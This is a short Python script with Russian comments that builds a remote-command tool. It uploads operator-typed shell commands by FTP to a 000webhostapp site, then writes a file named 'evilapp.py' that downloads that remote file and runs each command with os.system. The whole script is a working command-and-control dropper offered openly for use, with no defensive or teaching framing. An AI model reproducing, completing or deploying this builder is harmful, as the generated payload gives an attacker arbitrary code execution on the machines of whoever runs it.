from ftplib import FTP#подключаем библиотеку для работы с ftp
#создание команд листа
wer = True#для бесконечного цикла
C_list = []#массив С командами
print('вводите команды.для завершения ввода наберите #$')
while wer:#начало бесконечного цикла
	command = str(input())#ввод команд
	if command != "#$":#условия если строка не равна #$ то выполнить иначе цыкал false
		C_list.append(command)
	else:
		wer = False

loginFtp = input('ввидите логин от FTP сайта:')# здесь объяснять ничего
passwFtp = input('пароль:')# и тут тоже
nameFile = input("Имя файла на серваке:")# в папке public_html создастся файл с именем введённый в этой строке
hackServ = "https://"+loginFtp+".000webhostapp.com/"+nameFile# создаются URL для скачивание файла с командами

f = open(nameFile,"w")# открывается файл для редактирования который в последующем за кинется на сервер с командами
txt = ''# определение переменной для команд
for i in range(0,len(C_list)):# цикл для склеивания команд и спецсимволы между ними
	txt = txt +"@@"+ C_list[i]
f.write(txt)# запись в файл
f.close# закрытие файла
ftp = FTP('files.000webhost.com')# берется экземпляр класса ftp с параметром для подключения к серверу
print(ftp.login(loginFtp,passwFtp))# вывод информации о входе и сам вход
ftp.cwd("public_html")#Заходим в папку publish_HTML
f = open(nameFile,"rb")# открываем файл С командами
ftp.storbinary("STOR " + nameFile,f)# закидываем этот файл на сервер

#создание evilapp.py
qwq = open("evilapp.py","w")
z = ["import re, os, requests\n","def get_html(url):\n","\tr = requests.get(url)\n","\treturn r.text.split('@@')\n","def mission(stur):\n","\tfor wew in range(0,len(stur)):\n","\t\tos.system(stur[wew])\n","","mission(wer)"]
z[7]="wer = get_html('"+hackServ+"')\n"
for line in z:
	qwq.write(line)
print("Готова")